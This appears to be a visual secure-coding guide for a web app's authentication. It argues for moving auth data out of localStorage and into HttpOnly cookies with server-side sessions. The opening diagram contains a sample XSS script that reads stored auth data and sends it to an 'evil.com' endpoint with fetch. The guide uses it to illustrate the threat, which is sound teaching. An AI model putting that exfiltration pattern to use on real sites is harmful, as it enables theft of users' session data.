# Visual Guide: Secure Authentication Flow

## Problem: localStorage Vulnerability

```
┌─────────────────────────────────────────────────────┐
│                  Browser Window                      │
│                                                      │
│  ┌────────────────────────────────────────┐         │
│  │         Your Application               │         │
│  │                                        │         │
│  │  authStore.setUser(userData)          │         │
│  │       ↓                                │         │
│  │  localStorage.setItem('clover_auth',   │         │
│  │    JSON.stringify({                   │         │
│  │      id: "123",                       │         │
│  │      email: "user@example.com",       │         │
│  │      name: "John Doe"                 │         │
│  │    })                                 │         │
│  └────────────────────────────────────────┘         │
│                    ↓                                 │
│  ┌────────────────────────────────────────┐         │
│  │     localStorage (Plain Text)          │         │
│  │  ┌──────────────────────────────────┐  │         │
│  │  │ clover_auth: {                    │  │         │
│  │  │   "id": "123",                   │  │         │
│  │  │   "email": "user@example.com",   │  │         │
│  │  │   "name": "John Doe"             │  │         │
│  │  │ }                                │  │         │
│  │  └──────────────────────────────────┘  │         │
│  └────────────────────────────────────────┘         │
│                    ↓                                 │
│         ⚠️ VULNERABLE TO XSS ⚠️                     │
│                    ↓                                 │
│  ┌────────────────────────────────────────┐         │
│  │     Malicious Script (XSS Attack)      │         │
│  │                                        │         │
│  │  const data = localStorage             │         │
│  │    .getItem('clover_auth');            │         │
│  │  fetch('https://evil.com/steal', {    │         │
│  │    body: data                         │         │
│  │  });                                  │         │
│  └────────────────────────────────────────┘         │
└─────────────────────────────────────────────────────┘
```

## Solution: HttpOnly Cookie + Memory-Only State

```
┌──────────────────────────────────────────────────────────┐
│                    Browser Window                         │
│                                                           │
│  ┌─────────────────────────────────────────────┐        │
│  │         Your Application                     │        │
│  │                                              │        │
│  │  authStore.setUser(userData)                │        │
│  │       ↓                                      │        │
│  │  Store in MEMORY ONLY (RAM)                 │        │
│  │  • Lost on page refresh                     │        │
│  │  • Not accessible to other tabs             │        │
│  │  • Cannot be read by localStorage APIs      │        │
│  └─────────────────────────────────────────────┘        │
│                    ↕ HTTPS                               │
│  ┌─────────────────────────────────────────────┐        │
│  │     HttpOnly Cookie (Browser Managed)       │        │
│  │  ┌───────────────────────────────────────┐  │        │
│  │  │ SESSION_ID=abc123;                    │  │        │
│  │  │ HttpOnly ✓                            │  │        │
│  │  │ Secure ✓                              │  │        │
│  │  │ SameSite=Strict ✓                     │  │        │
│  │  └───────────────────────────────────────┘  │        │
│  │                                              │        │
│  │  ✗ JavaScript CANNOT read this              │        │
│  │  ✓ Browser automatically sends with requests│        │
│  └─────────────────────────────────────────────┘        │
└────────────────────┬─────────────────────────────────────┘
                     │ HTTPS Request with Cookie
                     │ Authorization: Bearer (in cookie)
                     ↓
┌──────────────────────────────────────────────────────────┐
│                    Backend Server                         │
│                                                           │
│  ┌─────────────────────────────────────────────┐        │
│  │     Session Validation Middleware           │        │
│  │                                              │        │
│  │  1. Extract SESSION_ID from cookie          │        │
│  │  2. Look up in session store (Redis/DB)     │        │
│  │  3. Check expiration                        │        │
│  │  4. Return user data if valid               │        │
│  └─────────────────────────────────────────────┘        │
│                    ↓                                      │
│  ┌─────────────────────────────────────────────┐        │
│  │     Session Store                           │        │
│  │  ┌───────────────────────────────────────┐  │        │
│  │  │ abc123 → {                            │  │        │
│  │  │   userId: "123",                      │  │        │
│  │  │   createdAt: 2026-04-27T10:00:00Z,    │  │        │
│  │  │   expiresAt: 2026-04-27T11:00:00Z     │  │        │
│  │  │ }                                     │  │        │
│  │  └───────────────────────────────────────┘  │        │
│  └─────────────────────────────────────────────┘        │
└──────────────────────────────────────────────────────────┘
```

## Login Flow Comparison

### Before (Insecure)

```
User enters credentials
        ↓
POST /api/auth/signin { username, password }
        ↓
Backend validates credentials
        ↓
Backend returns: { token: "jwt123", user: {...} }
        ↓
Frontend stores in localStorage:
localStorage.setItem('auth', JSON.stringify({
  token: "jwt123",
  user: {...}
}))
        ↓
❌ Token exposed to XSS attacks
❌ Persists until manually cleared
❌ Accessible by any script
```

### After (Secure)

```
User enters credentials
        ↓
POST /api/auth/signin { username, password }
        ↓
Backend validates credentials
        ↓
Backend creates server-side session
        ↓
Backend sets HttpOnly cookie:
Set-Cookie: SESSION_ID=xyz789; HttpOnly; Secure; SameSite=Strict
        ↓
Backend returns: { user: {...} }
        ↓
Frontend stores user info in MEMORY ONLY:
authStore.setUser(userData)
        ↓
✅ Session token NOT accessible to JavaScript
✅ Cookie sent automatically with requests
✅ Expires based on server configuration
✅ Protected from XSS theft
```

## Session Validation Flow

```
┌──────────────┐
│ Page Loads   │
└──────┬───────┘
       │
       ↓
┌──────────────────────────────────┐
│ AuthStore.initializeAuth()       │
│                                  │
│ fetch('/api/auth/profile', {     │
│   credentials: 'include'         │
│ })                               │
└──────┬───────────────────────────┘
       │
       ↓
┌──────────────────────┐
│ Backend receives     │
│ request WITH cookie  │
│ (automatic)          │
└──────┬───────────────┘
       │
       ↓
┌──────────────────────────┐
│ Validate session ID      │
│ from HttpOnly cookie     │
└──────┬───────────────────┘
       │
       ├─ Valid ──────────────────┐
       │                          │
       ↓                          ↓
┌──────────────┐         ┌────────────────┐
│ Return 200   │         │ Return 401     │
│ + User Data  │         │ Unauthorized   │
└──────┬───────┘         └──────┬─────────┘
       │                        │
       ↓                        ↓
┌──────────────┐       ┌──────────────────┐
│ Update state:│       │ Update state:    │
│ isAuthenticated│      │ isAuthenticated│
│ = true       │       │ = false        │
│ user = data  │       │ user = null    │
└──────────────┘       └──────────────────┘
```

## Periodic Session Monitoring

```
Timeline:
0 min    5 min    10 min   15 min   20 min
│────────│────────│────────│────────│
↓        ↓        ↓        ↓        ↓
Check    Check    Check    Check    Check
Session  Session  Session  Session  Session
         │
         ├─ Tab becomes inactive
         │
         ↓ (at 7 min)
    [No check - tab hidden]
         │
         ↓ (at 8 min - user returns)
    Visibility change detected
         ↓
    Immediate session check
         ↓
    If expired → Logout user
```

## XSS Attack Prevention

### Attack Attempt (Blocked)

```javascript
// Malicious script injected via XSS
try {
  // ❌ FAILS - Cookie is HttpOnly
  const cookies = document.cookie;
  console.log(cookies); 
  // Output: "" (session cookie not visible)
  
  // ❌ FAILS - No auth data in localStorage
  const auth = localStorage.getItem('clover_auth');
  console.log(auth);
  // Output: null
  
  // ❌ FAILS - Cannot access memory variables
  console.log(authStore.state.user);
  // Might work, but only shows current page's state
  // Cannot steal session token
  // Useless without session token
  
} catch (e) {
  console.error(e);
}
```

### What Attacker CAN Access

```javascript
// These are still accessible (non-sensitive):
authStore.getState().isAuthenticated  // boolean: true/false
authStore.getState().user?.name       // Public display name
authStore.getState().loading          // boolean

// These are PROTECTED:
// ✗ Session token (in HttpOnly cookie)
// ✗ User email (not stored client-side long-term)
// ✗ User ID persistence (cleared on refresh)
```

## Logout Flow

```
User clicks "Logout"
        ↓
authStore.logout()
        ↓
┌──────────────────────────────────┐
│ 1. POST /api/auth/logout         │
│    credentials: 'include'        │
└──────┬───────────────────────────┘
       │
       ↓
┌──────────────────────────────────┐
│ Backend invalidates session      │
│ Clears cookie:                   │
│ Set-Cookie: SESSION_ID=;         │
│   Max-Age=0; HttpOnly; Secure   │
└──────┬───────────────────────────┘
       │
       ↓
┌──────────────────────────────────┐
│ Frontend clears memory state:    │
│ state.user = null                │
│ state.isAuthenticated = false   │
│ sessionStorage.clear()           │
└──────┬───────────────────────────┘
       │
       ↓
Redirect to homepage
```

## Security Layers

```
┌─────────────────────────────────────────────┐
│         Defense in Depth Strategy           │
│                                             │
│  Layer 1: HttpOnly Cookie                   │
│  ┌───────────────────────────────────┐     │
│  │ Prevents JavaScript access        │     │
│  │ Blocks XSS token theft            │     │
│  └───────────────────────────────────┘     │
│           ↓                                 │
│  Layer 2: Secure Flag                       │
│  ┌───────────────────────────────────┐     │
│  │ Only transmitted over HTTPS       │     │
│  │ Prevents man-in-the-middle        │     │
│  └───────────────────────────────────┘     │
│           ↓                                 │
│  Layer 3: SameSite=Strict                   │
│  ┌───────────────────────────────────┐     │
│  │ Prevents cross-site requests      │     │
│  │ Blocks CSRF attacks               │     │
│  └───────────────────────────────────┘     │
│           ↓                                 │
│  Layer 4: Server-Side Session Store         │
│  ┌───────────────────────────────────┐     │
│  │ Full control over sessions        │     │
│  │ Can invalidate anytime            │     │
│  │ Track suspicious activity         │     │
│  └───────────────────────────────────┘     │
│           ↓                                 │
│  Layer 5: Memory-Only Client State          │
│  ┌───────────────────────────────────┐     │
│  │ No persistent storage             │     │
│  │ Lost on page close                │     │
│  │ Minimal data exposure             │     │
│  └───────────────────────────────────┘     │
│           ↓                                 │
│  Layer 6: Periodic Validation               │
│  ┌───────────────────────────────────┐     │
│  │ Detect stolen sessions            │     │
│  │ Enforce timeout policies          │     │
│  │ Real-time revocation              │     │
│  └───────────────────────────────────┘     │
└─────────────────────────────────────────────┘
```

## Key Takeaways

### ✅ Do This

```typescript
// Let backend manage sessions via cookies
await fetch('/api/auth/signin', {
  method: 'POST',
  credentials: 'include',  // Send/receive cookies
  body: JSON.stringify(credentials)
});

// Store only non-sensitive state in memory
authStore.setUser(userData);

// Use async logout for proper cleanup
await authStore.logout();

// Subscribe to state changes
authStore.subscribe(state => updateUI(state));
```

### ❌ Don't Do This

```typescript
// Never store tokens or user data in localStorage
localStorage.setItem('token', token);  // ❌
localStorage.setItem('user', userData); // ❌

// Never manually parse auth cookies
document.cookie.split(';')...  // ❌ (won't work anyway)

// Never bypass authStore for state management
myCustomState.user = user;  // ❌

// Never ignore HTTPS in production
http://yourapp.com  // ❌ (must use https://)
```

---

**Remember:** Security is not a feature, it's a foundation. Every layer matters.